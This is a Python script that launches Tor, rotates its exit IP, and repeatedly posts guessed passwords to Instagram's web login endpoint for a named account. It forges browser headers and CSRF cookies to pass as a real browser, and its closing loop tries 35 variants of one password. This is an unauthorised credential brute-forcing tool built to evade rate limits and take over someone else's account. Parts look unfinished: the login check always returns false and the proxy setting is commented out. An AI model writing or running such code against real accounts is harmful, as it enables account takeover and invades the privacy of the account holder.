#!/usr/bin/python3
import os
from timeit import default_timer
from shutil import which
from stem.control import Controller
from stem import Signal
import requests

class Tor(): 
    """
    Tor controlling class
    """
    def __init__(self,cport : int,hport : int,timeout = 20):
        self.cport = cport
        self.hport = hport
        self.timeout = timeout
        if which("tor") == None:
            return 0

    def change_ip(self):
        with Controller.from_port(port=self.cport) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)

    def start(self):
        self.stop()
        self.mktemp_config()
        os.system("{} -f torrc > /tmp/stdout &".format(which("tor")))
        start_time = default_timer()
        while True:
            with open("/tmp/stdout","r") as file:
                lines = file.read().split("\n")
                if len(lines) > 3 and "Bootstrapped 100%" in lines[-2]:
                        return "Started"
                else:
                    if abs(start_time-default_timer()) > self.timeout:
                        self.stop()
                        return "Timeout"
                    else:
                        continue
                file.close()

    def mktemp_config(self):
        file = open("torrc","w")
        file.write("ControlPort {}\nHTTPTunnelPort {}".format(self.cport,self.hport))
        file.close()

    def stop(self):
        return os.system("pkill {} > /dev/null 2>&1 ".format(os.path.basename(which("tor"))))

    def proxy(self):
        return {"http": "http://localhost:{}".format(self.hport), "https": "http://localhost:{}".format(self.hport)}


class Instagram():
    """
    Instagram controller
    """
    def __init__(self,username,Tor : Tor):
        self.username = username
        self.session = requests.session()
        try:
            line = self.session.get("https://instagram.com/"+username).text.split("\n")[13]
            if self.username not in line:
                self.userexists  = False
                self.name = None
            else:
                self.userexists = True
                self.name = line.split("(")[0].split(">")[-1][:-1]
            self.tor = Tor
            #self.session.proxies = self.tor.proxy()
        except Exception as e:
            print(str(e))

    def ipaddr(self) -> str:
        return self.session.get("https://httpbin.org/ip").json()["origin"]

    def split_passwords(self,passwords,nof) -> list:
        chunk_size = len(passwords)//nof
        if chunk_size > 0:
            return [passwords[i:i + chunk_size] for i in range(0,len(passwords),chunk_size)]
        else:
            return passwords

    def login(self,password) -> bool:
        url = "https://i.instagram.com/api/v1/web/accounts/login/ajax/"
        data = {
            'username': f'{self.username}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        head_pre = {
            "Host": "i.instagram.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Access-Control-Request-Method":"POST",
            "Access-Control-Request-Headers": "x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax",
            "Referer": "https://www.instagram.com/",
            "Origin": "https://www.instagram.com",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers"
        }
        self.session.cookies.clear()
        self.session.post(url,data = data,headers=head_pre) # prerequest
        response_cookies = self.session.cookies.get_dict()
        print(response_cookies)# gets tokens

        head_post = {
            "Host": "i.instagram.com",
            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-CSRFToken": response_cookies["csrftoken"],
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"324",
            "Origin":"https://www.instagram.com",
            "Alt-Used": "i.instagram.com",
            "Connection": "keep-alive",
            "Referer": "https://www.instagram.com/",
            "Cookie":"ig_did={}; ig_nrcb={}; mid={}; csrftoken={}".format(response_cookies["ig_did"],response_cookies["ig_nrcb"],response_cookies["mid"],response_cookies["csrftoken"]),
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers",
        }
        print(self.session.post(url,data = data,headers=head_post).text)
        return False

tor = Tor(9876,4949)
tor.start()
ig = Instagram("t_dynamos",tor)
for i in range(35):
    print(ig.login("ansh1234"+str(i)))
